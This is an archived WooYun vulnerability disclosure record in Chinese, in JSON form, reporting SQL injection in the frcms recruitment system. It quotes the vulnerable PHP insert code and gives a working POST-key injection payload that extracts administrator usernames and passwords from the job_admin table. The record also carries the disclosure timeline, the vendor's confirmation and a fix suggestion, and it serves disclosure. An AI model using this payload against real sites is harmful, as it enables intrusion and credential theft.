{"id": 38105, "wybug_id": "wooyun-2015-098170", "wybug_title": "嘉缘人才系统sql注入#3", "wybug_corp": "finereason.com", "wybug_author": "牛肉包子", "wybug_date": "2015-03-02 12:29", "wybug_open_date": "2015-06-03 13:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向公众公开  简要描述： 求20rank 详细说明：  首先看到frcms\\member\\requires_list.php\nif($do==\"savedata\"){\tif($_POST['id']==\"\"){    \t$_POST['sid']=intval($Memberid);    \t$_POST['member']=_getcookie('user_login');    \t$_POST['school']=_getcookie('user_name');\t\tif(empty($_POST['title'])){\t\t\tshowmsg('标题不能为空！','-1');exit;\t\t}\t\t$_POST['adddate']=date('Y-m-d H:i:s');\t\tunset($_POST['submit'],$_POST['reset'],$_POST['id']);\t\t$tks=$tvs='';\t\tforeach($_POST as $key=>$value){            if($value==''){\t\t\t\tcontinue;\t\t\t}else{\t\t\t\t$tks.=\"r_$key,\";\t\t\t\t$tvs.=\"'$value',\";\t\t\t}        }\t\t$tks=substr($tks,0,-1);\t\t//var_dump($tks);\t\t$tvs=substr($tvs,0,-1);\t\t\t$sql=\"insert into {$cfg['tb_pre']}require ($tks) values($tvs)\";\t\t//var_dump($sql);\t\t$db ->query($sql);        showmsg(\"添加成功！\",\"?m=requires_list&show=$show\");exit;\n可以看到POST的key没有进过单引号直接进入了insert语句。首先注册一个企业会员\n\n然后访问\nhttp://127.0.0.1/frcms/member/?m=requires_list\n然后添加招生简历\n\n然后抓包\n\n构造\ntitle,r_member,r_sid,r_content,r_flag,r_school,r_adddate)values('xxxx1','papapa','3','1',char(@`'`),(select(group_concat(a_user,0x7c,a_pass))from%0a%0ajob_admin),now())#=1&title=sssss&content=sssssssssss&id=&submit=%CC%ED+%BC%D3\n因为key直接进入了sql中。然后发包。可以看到mysql的日志文件\n\n语句已经执行了。然后查看招生简历\n\n可以看到账户密码已经出来了。   漏洞证明：  \n\n   修复方案：  转义   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-05 13:00 厂商回复： 修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-02 12:50 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:102        )\t\t \n  爷爷好恐怖    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}